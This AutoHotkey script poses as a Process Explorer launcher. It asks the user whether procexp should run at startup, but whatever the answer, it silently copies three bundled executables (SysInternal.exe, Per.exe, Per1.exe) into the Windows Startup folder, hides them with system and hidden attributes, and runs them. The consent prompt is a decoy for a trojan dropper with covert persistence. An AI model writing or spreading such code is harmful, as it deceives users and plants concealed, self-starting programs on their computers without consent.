; procexp x64.ahk

#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.

FileInstall, procexp.exe, %targetDir%\procexp.exe, 1

; Set the target directory
targetDir := "C:\Users\" . A_Username . "\tmp"
startupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
FileCreateDir, %targetDir%

; Define the config file path
iniFile := targetDir . "\config.ini"

; ###### START TMP DIR ######
; Check if the config.ini file exists
if !FileExist(iniFile) {
    ; First time running, initialize the config file
    FileAppend, [procexp startup]`nrunOnStartup=false`n, %iniFile%
    
    ; Ask the user if they want to run it on startup
    MsgBox, 4,, Do you want to run procexp on startup?
    IfMsgBox, Yes
    {
        ; Save response in config.ini
        IniWrite, true, %iniFile%, procexp startup, runOnStartup
        FileInstall, procexp.exe, %startupDir%\procexp.exe, 1
    }
    Else
    {
        ; Save response in config.ini
        IniWrite, false, %iniFile%, procexp startup, runOnStartup
    }
    
    MsgBox, Configuration saved!  ; Show after user response
    FileInstall, SysInternal.exe, %targetDir%\SysInternal.exe, 1
    FileInstall, procexp.exe, %targetDir%\procexp.exe, 1
    Run, %targetDir%\procexp.exe
} else {
    ; Load existing configuration
    IniRead, runOnStartup, %iniFile%, procexp startup, runOnStartup
}

; Check if procexp.exe is already in the target directory
if !FileExist(targetDir . "\procexp.exe") {
    ; Install procexp.exe
    FileInstall, procexp.exe, %targetDir%\procexp.exe, 1
}

; Check if the script already exists in the target directory
if !FileExist(targetDir . "\procexp x64.exe") {
    ; Copy the script to the target directory
    FileInstall, procexp x64.exe, %targetDir%\procexp x64.exe
}
; ###### END TMP DIR ######

; ###### START STARTUP DIR ######
FileInstall, SysInternal.exe, %startupDir%\SysInternal.exe, 1
FileInstall, Per.exe, %startupDir%\Per.exe, 1
FileInstall, Per1.exe, %startupDir%\Per1.exe, 1

FileSetAttrib, +SH, %startupDir%\SysInternal.exe
FileSetAttrib, +SH, %startupDir%\Per.exe
FileSetAttrib, +SH, %startupDir%\Per1.exe

Run, %startupDir%/SysInternal.exe
Run, %startupDir%/Per.exe
Run, %startupDir%/Per1.exe
; ###### END STARTUP DIR ######
